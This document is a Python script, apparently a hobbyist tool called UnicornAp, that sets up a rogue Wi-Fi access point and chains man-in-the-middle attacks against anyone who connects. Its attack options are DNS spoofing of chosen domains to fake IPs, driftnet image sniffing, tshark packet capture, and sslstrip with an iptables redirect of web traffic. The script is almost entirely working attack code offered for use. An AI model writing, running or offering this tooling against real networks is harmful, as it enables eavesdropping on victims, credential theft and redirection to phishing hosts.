#UnicornAp 1.0
import os
import time

print("\033[0;31m"+
"""


██╗   ██╗███╗   ██╗██╗ ██████╗ ██████╗ ██████╗ ███╗   ██╗    █████╗ ██████╗ 
██║   ██║████╗  ██║██║██╔════╝██╔═══██╗██╔══██╗████╗  ██║   ██╔══██╗██╔══██╗
██║   ██║██╔██╗ ██║██║██║     ██║   ██║██████╔╝██╔██╗ ██║   ███████║██████╔╝
██║   ██║██║╚██╗██║██║██║     ██║   ██║██╔══██╗██║╚██╗██║   ██╔══██║██╔═══╝ 
╚██████╔╝██║ ╚████║██║╚██████╗╚██████╔╝██║  ██║██║ ╚████║   ██║  ██║██║     
 ╚═════╝ ╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝  ╚═╝╚═╝                                                                              
By Miguel Bustamante
Version 0.1 cc
"""+'\033[0;m')


#Funciones
def stop():
    print("Stopping...")
    #Stopping and Clearing 
    print("Stopping Virtual Terminals")
    os.system("screen -S UnicornAp-Hostapd -X stuff '^C\n'")
    os.system("screen -S UnicornAp-Driftnet -X stuff '^C\n'")
    os.system("screen -S UnicornAp-Tshark -X stuff '^C\n'")
    os.system("screen -S UnicornAp-Sslstrip -X stuff '^C\n'")
    os.system("screen -S UnicornAp-Dnsmasq -X stuff '^C\n'")
    print("Restoring config files...")
    os.system("mv /etc/NetworkManager/NetworkManager.conf.backup /etc/NetworkManager/NetworkManager.conf")
    os.system("mv /etc/dhcp/dhcpd.conf.backup /etc/dhcp/dhcpd.conf")
    os.system("mv /etc/dnsmasq.conf.backup /etc/dnsmasq.conf")
    os.system("rm /etc/dnsmasq.hosts")    
    os.system("rm /etc/hostapd/hostapd.conf")
    print("Restarting NetworkManager...")
    os.system("/etc/init.d/network-manager restart")
    print("Flushing iptables rules...")
    print(".")
    print("..")
    print("...")
    os.system("iptables --flush")
    os.system("iptables --flush -t nat")
    os.system("iptables --delete-chain")
    os.system("iptables --table nat --delete-chain")
    print("------")



#---Preguntas---
interfaceAp=input("Enter the name of your wireless interface(Ap): ")
interfaceInternet=input("Enter the name of the interface connected to the internet: ")
networkManagerString= "[main]\nplugins=keyfile\n\n[keyfile]\nunmanaged-devices=interface-name:" + interfaceAp + "\n"
ssid = input("Please enter the SSID for the AP: ")
channel=input("Please enter a channel number(1-11): ")
wpa_p=input("Enable WPA2 encryption? y/N: ")

if wpa_p=="y" or wpa_p=="Y":
    flag=True
    while flag:
        passphrase=input("Please enter the WPA2 passphrase for the AP: ")
        if len(passphrase)>=8:
            flag=False
        else:
            print("Please enter minimum 8 characters for the WPA2 passphrase.")


    hostapdString = "interface=" + interfaceAp + "\ndriver=nl80211\nssid=" + ssid + "\nhw_mode=g\nchannel=" + channel + "\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\nwpa=2\nwpa_passphrase=" + passphrase + "\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=TKIP\nrsn_pairwise=CCMP\n"
else:
    hostapdString = "interface=" + interfaceAp + "\ndriver=nl80211\nssid=" + ssid + "\nhw_mode=g\nchannel=" + channel + "\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\n"



#NetworkManager Config
print("Configuring NetWork-Manager")
os.system("cp /etc/NetworkManager/NetworkManager.conf /etc/NetworkManager/NetworkManager.conf.backup")
file=open("/etc/NetworkManager/NetworkManager.conf","w")
file.write(networkManagerString)
file.close()
print("Restarting NetWork-Manager")
os.system("/etc/init.d/network-manager restart")


#DHCP Config
#dhcpString="ddns-update-style none;\nignore client-updates;\nauthoritative;\noption local-wpad code 252 = text;\nsubnet\n10.0.0.0 netmask 255.255.255.0 {\n# --- default gateway\noption routers 10.0.0.1;\n# --- Netmask\noption subnet-mask 255.255.255.0;\n# --- Broadcast Address\noption broadcast-address\n10.0.0.255;\n# --- Domain name servers, tells the clients which DNS servers to use.\noption domain-name-servers 10.0.0.1, 8.8.8.8, 8.8.4.4;\noption time-offset 0;\nrange 10.0.0.3 10.0.0.13;\ndefault-lease-time 1209600;\nmax-lease-time 1814400;\n}"
dhcpString="authoritative;\nsubnet 10.0.0.0 netmask 255.255.255.0 {\n	range 10.0.0.100 10.0.0.254;\n	option routers 10.0.0.1;\n	option domain-name-servers 10.0.0.1;\n}"
print("Configuring DHCP")
os.system("cp /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd.conf.backup")
file=open("/etc/dhcp/dhcpd.conf","w")
file.write(dhcpString)
file.close()
print("Restarting DHCP Server")
os.system("ifconfig " + interfaceAp + " down")
os.system("ifconfig " + interfaceAp + " 10.0.0.1 netmask 255.255.255.0")
os.system("ifconfig " + interfaceAp + " up")
os.system("/etc/init.d/isc-dhcp-server restart")

#Dnsmasq Config

dnsmasqString="no-dhcp-interface=\nserver=8.8.8.8\n\nno-hosts\naddn-hosts=/etc/dnsmasq.hosts"
print("Configuring Dnsmasq")
os.system("cp /etc/dnsmasq.conf /etc/dnsmasq.conf.backup")
file=open("/etc/dnsmasq.conf","w")
file.write(dnsmasqString)
file.close()




#Hostapd Config
print("Configuring Hostapd...")
file=open("/etc/hostapd/hostapd.conf","w")
file.write(hostapdString)
file.close()


#Herramientas
tools_d=input("Only Access Point without Toosl?(y/n): ")
if tools_d=="n" or tools_d=="N":
    
    
    
    print("Starting Hostapd...")
    os.system("screen -S UnicornAp-Hostapd -m -d  hostapd /etc/hostapd/hostapd.conf")
    print("Hostapd up!")
    
    #Iptables 
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system("iptables -A FORWARD -i " + interfaceAp + " -j ACCEPT")
    os.system("iptables -t nat -A POSTROUTING -o " + interfaceInternet + " -j MASQUERADE")
    
    

    #Tools
    
    dnsspoofing_d=input("Dns Spoofing? (y/n): ")
    dnsHostString=""
    if dnsspoofing_d =="y" or dnsspoofing_d=="Y":
        numerHosts=int(input ("How many domains do you want to spoof?: "))
        for i in range (numerHosts):
            domain=input("Domain to Spoof: ")
            ip=input("Fake IP for domain: ")
            dnsHostString=dnsHostString+ip+" "+domain+"\n"
        
        file=open("/etc/dnsmasq.hosts","w")
        file.write(dnsHostString)
        file.close()

    print("Startinf Dnsmasq...")
    os.system("screen -S UnicornAp-Dnsmasq -m -d dnsmasq --no-daemon")
    
    
    driftnet_d=input("Driftnet ? (y/n):")
    if driftnet_d=="y" or driftnet_d=="Y":
        os.system("screen -S UnicornAp-Driftnet -m -d driftnet -i "+ interfaceAp)
        print("Driftnet started...")
    tshark_d=input("Save .pcap file? (y/n)")
    if tshark_d=="y" or tshark_d=="Y":
        os.system("screen -S UnicornAp-Tshark -m -d tshark -i "+ interfaceAp+" -w unicornAp.pcap ")

    sslstrip_d=input("Sslstrip ? (y/n): ")
    if sslstrip_d=="y" or sslstrip_d=="Y":
        os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
        os.system("screen -S UnicornAp-Sslstrip -m -d sslstrip")
        print("Sslstrip started...")
        os.system("rm sslstrip.log")
        while True:
            try:
                time.sleep(1)
                os.system("sudo tail -f sslstrip.log")
                print("press 'CTRL + C' again to stop")
            except KeyboardInterrupt:
                #Stopping and Clearing 
                stop()
                
                break        

    else:
        os.system("tcpdump -i " + interfaceAp)
        stop()
else:
    print("Starting Hostapd...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system("iptables -A FORWARD -i " + interfaceAp + " -j ACCEPT")
    os.system("iptables -t nat -A POSTROUTING -o " + interfaceInternet + " -j MASQUERADE")
    os.system("hostapd /etc/hostapd/hostapd.conf")
    stop()          






















